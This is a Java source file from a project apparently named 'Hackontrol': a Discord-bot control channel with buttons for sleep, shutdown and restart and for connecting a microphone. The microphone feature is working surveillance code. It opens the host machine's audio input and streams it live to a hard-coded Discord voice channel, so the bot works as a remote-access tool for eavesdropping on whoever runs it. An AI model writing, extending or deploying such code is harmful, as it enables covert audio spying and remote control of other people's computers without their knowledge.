package com.khopan.hackontrol.channel;

import java.nio.ByteBuffer;

import javax.sound.sampled.AudioInputStream;
import javax.sound.sampled.AudioSystem;
import javax.sound.sampled.DataLine.Info;
import javax.sound.sampled.TargetDataLine;

import com.khopan.hackontrol.HackontrolChannel;
import com.khopan.hackontrol.manager.button.ButtonInteraction;
import com.khopan.hackontrol.manager.button.ButtonManager;
import com.khopan.hackontrol.registry.Registry;
import com.khopan.hackontrol.utils.ErrorUtils;

import net.dv8tion.jda.api.audio.AudioSendHandler;
import net.dv8tion.jda.api.entities.Guild;
import net.dv8tion.jda.api.entities.channel.concrete.VoiceChannel;
import net.dv8tion.jda.api.events.interaction.component.ButtonInteractionEvent;
import net.dv8tion.jda.api.interactions.components.buttons.ButtonStyle;
import net.dv8tion.jda.api.managers.AudioManager;

public class ControlChannel extends HackontrolChannel {
	private static final String CHANNEL_NAME = "control";

	private static final String SLEEP_BUTTON_IDENTIFIER = "controlSleep";
	private static final String SHUTDOWN_BUTTON_IDENTIFIER = "controlShutdown";
	private static final String RESTART_BUTTON_IDENTIFIER = "controlRestart";

	private static final String CONNECT_BUTTON_IDENTIFIER = "controlConnect";
	private static final String DISCONNECT_BUTTON_IDENTIFIER = "controlDisconnect";

	private AudioManager audioManager;
	private SendHandler handler;

	public ControlChannel() {

	}

	@Override
	public String getName() {
		return ControlChannel.CHANNEL_NAME;
	}

	@Override
	public void initialize() {
		this.channel.sendMessage("**Power Control**").addActionRow(
				ButtonManager.staticButton(ButtonStyle.SUCCESS, "Sleep", ControlChannel.SLEEP_BUTTON_IDENTIFIER),
				ButtonManager.staticButton(ButtonStyle.DANGER, "Shutdown", ControlChannel.SHUTDOWN_BUTTON_IDENTIFIER),
				ButtonManager.staticButton(ButtonStyle.PRIMARY, "Restart", ControlChannel.RESTART_BUTTON_IDENTIFIER)
				).queue();

		this.channel.sendMessage("**Microphone Control**").addActionRow(
				ButtonManager.staticButton(ButtonStyle.SUCCESS, "Connect", ControlChannel.CONNECT_BUTTON_IDENTIFIER),
				ButtonManager.staticButton(ButtonStyle.DANGER, "Disconnect", ControlChannel.DISCONNECT_BUTTON_IDENTIFIER)
				).queue();
	}

	@Override
	public void register(Registry registry) {
		registry.register(ButtonManager.STATIC_BUTTON_REGISTRY, ControlChannel.SLEEP_BUTTON_IDENTIFIER, interaction -> this.power(interaction, PowerAction.SLEEP));
		registry.register(ButtonManager.STATIC_BUTTON_REGISTRY, ControlChannel.SHUTDOWN_BUTTON_IDENTIFIER, interaction -> this.power(interaction, PowerAction.SHUTDOWN));
		registry.register(ButtonManager.STATIC_BUTTON_REGISTRY, ControlChannel.RESTART_BUTTON_IDENTIFIER, interaction -> this.power(interaction, PowerAction.RESTART));
		registry.register(ButtonManager.STATIC_BUTTON_REGISTRY, ControlChannel.CONNECT_BUTTON_IDENTIFIER, interaction -> this.connect(interaction, true));
		registry.register(ButtonManager.STATIC_BUTTON_REGISTRY, ControlChannel.DISCONNECT_BUTTON_IDENTIFIER, interaction -> this.connect(interaction, false));
	}

	private void power(ButtonInteraction interaction, PowerAction powerAction) {
		interaction.yesNoQuestion("Are you sure you want to " + powerAction.text + '?', answer -> {
			if(answer) {
				this.powerCallback(interaction, powerAction, answer);
			}
		});
	}

	private void powerCallback(ButtonInteraction interaction, PowerAction powerAction, boolean answer) {
		interaction.getEvent().getChannel().sendMessage(powerAction.text).queue();
	}

	private void connect(ButtonInteraction interaction, boolean connect) {
		ButtonInteractionEvent Event = interaction.getEvent();

		if(connect) {
			Event.deferEdit().queue();
			this.connectCallback(interaction, true);
			return;
		}

		if(this.handler == null) {
			Event.reply("Hackontrol is already disconnected").addActionRow(ButtonManager.selfDelete(ButtonStyle.SUCCESS, "Ok")).queue(ButtonManager :: dynamicButtonCallback);
			return;
		}

		interaction.yesNoQuestion("Are you sure you want to disconnect?", answer -> {
			if(answer) {
				this.connectCallback(interaction, false);
			}
		});
	}

	private void connectCallback(ButtonInteraction interaction, boolean connect) {
		try {
			if(connect) {
				this.connect(interaction);
			} else {
				this.disconnect(interaction);
			}
		} catch(Throwable Errors) {
			ErrorUtils.sendErrorMessage(interaction.getEvent().getChannel(), Errors);
		}
	}

	private void connect(ButtonInteraction interaction) throws Throwable {
		ButtonInteractionEvent Event = interaction.getEvent();
		Guild guild = Event.getGuild();

		if(this.audioManager == null) {
			this.audioManager = guild.getAudioManager();
		}

		VoiceChannel channel = guild.getVoiceChannelById(1230856739793145919L);

		if(this.handler != null) {
			this.handler.close();
			this.audioManager.closeAudioConnection();
		}

		this.handler = new SendHandler();
		this.audioManager.setSendingHandler(this.handler);
		this.audioManager.setSelfDeafened(true);
		this.audioManager.openAudioConnection(channel);
	}

	private void disconnect(ButtonInteraction interaction) throws Throwable {
		ButtonInteractionEvent Event = interaction.getEvent();
		Guild guild = Event.getGuild();

		if(this.audioManager == null) {
			this.audioManager = guild.getAudioManager();
		}

		this.audioManager.closeAudioConnection();

		if(this.handler == null) {
			return;
		}

		this.handler.close();
		this.handler = null;
	}

	private static enum PowerAction {
		SLEEP("sleep"),
		SHUTDOWN("shutdown"),
		RESTART("restart");

		private final String text;

		PowerAction(String text) {
			this.text = text;
		}
	}

	private static class SendHandler implements AudioSendHandler {
		private final TargetDataLine line;
		private final AudioInputStream stream;
		private final int size;

		private volatile boolean open;

		private SendHandler() throws Throwable {
			Info info = new Info(TargetDataLine.class, AudioSendHandler.INPUT_FORMAT);
			this.line = (TargetDataLine) AudioSystem.getLine(info);
			this.line.open();
			this.line.start();
			this.stream = new AudioInputStream(this.line);
			this.size = Math.round(AudioSendHandler.INPUT_FORMAT.getSampleRate() * 0.02f * ((float) AudioSendHandler.INPUT_FORMAT.getChannels()) * ((float) AudioSendHandler.INPUT_FORMAT.getSampleSizeInBits()) * 0.125f);
			this.open = true;
		}

		@Override
		public boolean canProvide() {
			return this.open;
		}

		@Override
		public ByteBuffer provide20MsAudio() {
			try {
				return ByteBuffer.wrap(this.stream.readNBytes(this.size));
			} catch(Throwable Errors) {
				return ByteBuffer.allocate(0);
			}
		}

		private void close() throws Throwable {
			this.open = false;
			this.line.stop();
			this.line.close();
			this.stream.close();
		}
	}
}
